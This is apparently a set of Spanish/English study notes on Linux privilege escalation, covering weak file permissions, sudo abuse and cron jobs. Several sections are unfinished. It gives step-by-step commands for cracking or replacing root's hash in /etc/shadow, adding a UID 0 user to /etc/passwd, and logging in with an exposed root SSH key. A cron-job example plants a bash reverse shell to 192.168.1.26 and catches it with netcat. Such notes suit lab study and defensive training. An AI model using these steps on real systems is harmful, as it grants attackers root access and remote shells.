# PRIVILEGE ESCALATION IN LINUX

## Conceptos Generales

<p>Nuestro objetivo final con la escalada de privilegios en Linux es obtener un shell
que se ejecuta como el usuario root.</p>
<p>La escalada de privilegios puede ser simple (por ejemplo, un exploit del kernel) o requerir un
mucho reconocimiento en el sistema comprometido.</p>
<p>En muchos casos, la escalada de privilegios puede no depender simplemente de una única
configuración errónea, sino que puede requerir que pienses y combines
múltiples configuraciones erróneas.</p>

<p>Todas las escaladas de privilegios son efectivamente ejemplos de violaciones de
de control de acceso.</p>
<p>El control de acceso y los permisos de usuario están intrínsecamente relacionados.</p>
<p>Al centrarse en las escaladas de privilegios en Linux,entender cómo Linux maneja los permisos es muy
importante.</p>

## Comprendiendo los Permisos en Linux

### Users, Groups, and Files & Directories

<p>En un nivel básico, los permisos en Linux son una relación entre
usuarios, grupos y archivos y directorios. </p>
<p>Los usuarios pueden pertenecer a múltiples grupos.</p>
<p>Los grupos pueden tener múltiples usuarios. </p>
<p>Cada archivo y directorio define sus permisos en términos de un usuario, un
grupo, y "otros" (todos los demás usuarios).</p>

#

## Weak File Permissions

<p>Ciertos archivos del sistema pueden ser aprovechados para realizar
escalada de privilegios si los permisos sobre ellos son demasiado débiles.</p>
<p>Si un archivo del sistema tiene información confidencial que podemos leer, puede
ser utilizado para obtener acceso a la cuenta de root.</p>
<p>Si se puede escribir en un archivo del sistema, podemos modificar la
funcionamiento del sistema operativo y obtener así el acceso de root.</p>

### Useful Commands

Find all writable files in /etc:

```
$ find /etc -maxdepth 1 -writable -type f
```

Find all readable files in /etc:

```
$ find /etc -maxdepth 1 -readable -type f
```

Find all directories which can be written to:

```
$ find / -executable -writable -type d 2> /dev/null
```

## /etc/shadow

<p>El archivo /etc/shadow contiene los hashes de las contraseñas de los usuarios, y por
por defecto no es legible por ningún usuario excepto por el root.</p>
<p>Si somos capaces de leer el contenido del archivo /etc/shadow, podríamos
podríamos ser capaces de descifrar el hash de la contraseña del usuario root.</p>
<p>Si somos capaces de modificar el archivo /etc/shadow, podemos reemplazar
el hash de la contraseña del usuario root por uno que conozcamos.</p>

## Privilege Escalation

1- Check the permissions of the /etc/shadow file:

```
$ ls -l /etc/shadow
-rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow
```

2- Extract the root user’s password hash:

```
$ head -n 1 /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXv
RDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

3- Save the password hash in a file (e.g. hash.txt):

```
$ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl
aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
```

4-Crack the password hash using john:

```
$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.t
xt hash.txt
...
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE
2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
password123
(?)
```

5- Use the su command to switch to the root user, entering the password we cracked when prompted:

```
$ su
Password:
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)
```

## Privilege Escalation (#2)

1- Check the permissions of the /etc/shadow file:

```
$ ls -l /etc/shadow
-rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow
```

Note that it is world writable.

2- Copy / save the contents of /etc/shadow so we can
restore it later.

3- Generate a new SHA-512 password hash:

```
$ mkpasswd -m sha-512 newpassword
$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VE
WwO/okK3vi1IdVaO9.xt4IQMY4OUj/
```

4- Edit the /etc/shadow and replace the root user’s
password hash with the one we generated.

```
root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoO
lL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
```

5- Use the su command to switch to the root user,
entering the new password when prompted:

```
$ su
Password:
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)
```

## /etc/shadow

<p>Históricamente, el archivo /etc/passwd contenía los hash de las contraseñas de los usuarios.</p>
<p>Por compatibilidad con el pasado, si el segundo campo de una fila de usuario en /etc/passwd
contiene un hash de contraseña, tiene prioridad sobre el hash en /etc/shadow.</p>
<p>Si podemos escribir en /etc/passwd, podemos introducir fácilmente un hash de contraseña conocido para
el usuario root, y luego usar el comando su para cambiar al usuario root.</p>
<p>Alternativamente, si sólo podemos anexar al archivo, podemos crear un nuevo usuario pero
asignarle el ID del usuario root (0). Esto funciona porque Linux permite múltiples entradas
para el mismo ID de usuario, siempre que los nombres de usuario sean diferentes.</p>

## /etc/shadow

La cuenta root en /etc/passwd suele estar configurada así:

```
root:x:0:0:root:/root:/bin/bash
```

<p>La "x" en el segundo campo indica a Linux que busque el hash de la contraseña
en el archivo /etc/shadow.</p>
<p>En algunas versiones de Linux, es posible simplemente borrar la "x", que
Linux interpreta que el usuario no tiene contraseña:</p>

```
root::0:0:root:/root:/bin/bash
```

## Privilege Escalation

1- Check the permissions of the /etc/passwd file:

```
$ ls -l /etc/passwd
-rw-r--rw- 1 root root 951 May 13 2017 /etc/passwd
```

2- Generate a password hash for the password “password”
using openssl:

```
$ openssl passwd "password"
L9yLGxncbOROc
```

3- Edit the /etc/passwd file and enter the hash in the
second field of the root user row:

```
root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

4- Use the su command to switch to the root user:

```
$ su
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
```

5- Alternatively, append a new row to /etc/passwd to
create an alternate root user (e.g. newroot):

```
newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

6- Use the su command to switch to the newroot user:

```
$ su newroot
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
```

#

## Backups

<p>Incluso si una máquina tiene permisos correctos en archivos importantes o
archivos sensibles, un usuario puede haber creado copias de seguridad inseguras de
estos archivos.</p>
<p>Siempre vale la pena explorar el sistema de archivos en busca de archivos de
archivos de copia de seguridad legibles. Algunos lugares comunes son los directorios home
del usuario, el directorio / (root), /tmp y /var/backups.</p>

## Privilege Escalation

1- Look for interesting files, especially hidden files, in common
locations:

```
$ ls -la /home/user
$ ls -la /
$ ls -la /tmp
$ ls -la /var/backups
```

2- Note that a hidden .ssh directory exists in the system root:

```
$ ls -la /
drwxr-xr-x 2 root root 4096 Aug 24 18:57 .ssh
```

3- In this directory, we can see a world-readable file called root_key:

```
$ ls -l /.ssh
total 4
-rw-r--r-- 1 root root 1679 Aug 24 18:57 root_key
```

4- Further inspection of this file seems to indicate that this is an SSH private
key. The name and owner of the file suggests this key belongs to the root
user:

```
$ head -n 1 /.ssh/root_key
-----BEGIN RSA PRIVATE KEY-----
```

5- Before we try to use this key, let’s confirm that root logins are even
allowed via SSH:

```
$ grep PermitRootLogin /etc/ssh/sshd_config
PermitRootLogin yes
```

6- Copy the key over to your local machine, and give it correct
permissions (otherwise SSH will refuse to use it):

```
# chmod 600 root_key
```

7- Use the key to SSH to the target as the root account:

```
# ssh -i root_key root@192.168.1.32
```

#

# SUDO

## What is sudo ?

sudo es un programa que permite a los usuarios ejecutar otros programas con los privilegios de seguridad
privilegios de seguridad de otros usuarios. Por defecto, ese otro usuario será root.
Un usuario generalmente necesita introducir su contraseña para usar sudo, y debe
debe tener acceso a través de reglas en el archivo /etc/sudoers.
Las reglas pueden ser usadas para limitar a los usuarios a ciertos programas, y renunciar al
el requisito de introducir la contraseña.

## Comandos útiles

Ejecutar un programa usando sudo:

```
$ sudo <program>
```

Ejecutar un programa como un usuario específico:

```
$ sudo –u <username> <program>
```

Lista de programas que un usuario tiene permitido (y no permitido) ejecutar:

```
$ sudo -l
```

## Conociendo la Contraseña:

La escalada de privilegios más obvia con sudo es usar sudo como
¡fue concebido!
Si su cuenta de usuario con pocos privilegios puede usar sudo sin restricciones (es decir, puede
ejecutar cualquier programa) y conoce la contraseña del usuario, la escalada de privilegios
es fácil, utilizando el comando "switch user" (su) para generar un shell de root:

```
$ sudo su
```

## Otros Metodos

Si por alguna razón el programa su no está permitido, hay muchas otras
formas de escalar privilegios:

```
$ sudo -s
$ sudo -i
$ sudo /bin/bash
$ sudo passwd
```

Incluso si no hay métodos "obvios" para escalar privilegios, podemos
ser capaces de utilizar una secuencia de escape del shell.

## Shell Escape Sequences

<p>Incluso si estamos restringidos a ejecutar ciertos programas a través de sudo, es a veces es posible "escapar" del programa y generar un shell.</p>
<p>Como el programa inicial se ejecuta con privilegios de root, también lo hace el shell generada.
Una lista de programas con sus secuencias de escape de shell se puede encontrar aquí: https://gtfobins.github.io/ </p>

## Privilege Escalation (Generic)

1- Enumere los programas que su usuario puede ejecutar a través de sudo:

```
sudo -l
NOPASSWD: /usr/sbin/iftop
NOPASSWD: /usr/bin/find
NOPASSWD: /usr/bin/nano
NOPASSWD: /usr/bin/vim
NOPASSWD: /usr/bin/man
NOPASSWD: /usr/bin/awk
```

2- Para cada programa de la lista, ver si hay una secuencia de escape del shell secuencia de escape en GTFOBins
(https://gtfobins.github.io/)

3- Si existe una secuencia de escape, ejecute el programa mediante sudo y ejecute la secuencia para generar un shell
shell.

## Abuso de la funcionalidad prevista

 <p>Si un programa no tiene una secuencia de escape, todavía puede ser
posible utilizarlo para escalar privilegios.
Si podemos leer archivos propiedad de root, podemos ser capaces de extraer información útil (por ejemplo, contraseñas, hashes, claves).
Si podemos escribir en los archivos propiedad de root, podemos ser capaces de insertar o modificar información. </p>

## Variables de entorno

 <p>Los programas ejecutados a través de sudo pueden heredar las variables de entorno del entorno del usuario.
En el archivo de configuración /etc/sudoers, si se establece la opción env_reset, sudo ejecutará los programas en un nuevo entorno mínimo.
La opción env_keep puede ser usada para mantener ciertas variables de entorno del entorno del usuario.
Las opciones configuradas se muestran al ejecutar sudo -l. </p>

## LD_PRELOAD

<p>LD_PRELOAD es una variable de entorno que puede establecerse a
la ruta de un archivo de objeto compartido (.so).
Cuando se establece, el objeto compartido se cargará antes que cualquier otro.
Creando un objeto compartido personalizado y creando una función init() podemos ejecutar código tan pronto como se cargue el objeto.</p>

## Limitations

<p>LD_PRELOAD no funcionará si el ID de usuario real es diferente
del ID de usuario efectivo.
sudo debe ser configurado para preservar la variable de entorno LD_PRELOAD utilizando la opción env_keep.</p>

## Privilege Escalation

falta desarrollar

## LD_LIBRARY_PATH

La variable de entorno LD_LIBRARY_PATH contiene un conjunto de directorios donde se buscan primero las bibliotecas compartidas.
El comando ldd puede utilizarse para imprimir las bibliotecas compartidas utilizadas por un programa:

```
$ ldd /usr/sbin/apache2
```

Creando una biblioteca compartida con el mismo nombre que la utilizada por un programa, y estableciendo LD_LIBRARY_PATH en su directorio padre, el programa cargará nuestra biblioteca compartida en su lugar.

## Privilege Escalation

falta desarrollar

#

## Cron Jobs

<p>Los Cron jobs son programas o scripts que los usuarios pueden programar para para que se ejecuten en momentos o intervalos específicos.
Los Cron jobs se ejecutan con el nivel de seguridad del usuario que los posee que los posee.
Por defecto, los cron jobs se ejecutan utilizando el shell /bin/sh, con
variables de entorno limitadas. </p>

<p>Los archivos de tabla de cron (crontabs) almacenan la configuración de trabajos de cron.
<p>Los crontabs de usuario suelen estar ubicados en /var/spool/cron/ o
/var/spool/cron/crontabs/ .</p>
<p> El crontab de todo el sistema se encuentra en /etc/crontab.</p>

## File Permissions

Una mala configuración de los permisos de los archivos asociados a los trabajos cron puede llevar a una fácil escalada de privilegios.
Si podemos escribir en un programa o script que se ejecuta como parte de un trabajo cron, podemos reemplazarlo con nuestro propio código.

## Privilege Escalation

1- Ver el contenido del crontab de todo el sistema:

```
$ cat /etc/crontab
...
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

2- Localice el archivo overwrite.sh en el servidor:

```
$ locate overwrite.sh
/usr/local/bin/overwrite.sh
```

3- Check the file’s permissions:

```
$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13 2017 /usr/local/bin/overwrite.sh
```

4- Reemplace el contenido del archivo overwrite.sh con lo siguiente:

```
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.26/53 0>&1
```

5- Ejecute un listener de netcat en su máquina local y espere a que
que se ejecute la tarea cron. Un shell inverso ejecutado como el usuario debería ser capturado:

```
# nc –nvlp 53
Listening on [any] 53 ...
Connect to [192.168.1.26] from (UNKNOWN) [192.168.1.25] 47352
bash: no job control in this shell
root@debian:~# id
id
uid=0(root) gid=0(root) groups=0(root)

```

## PATH Environment Variable
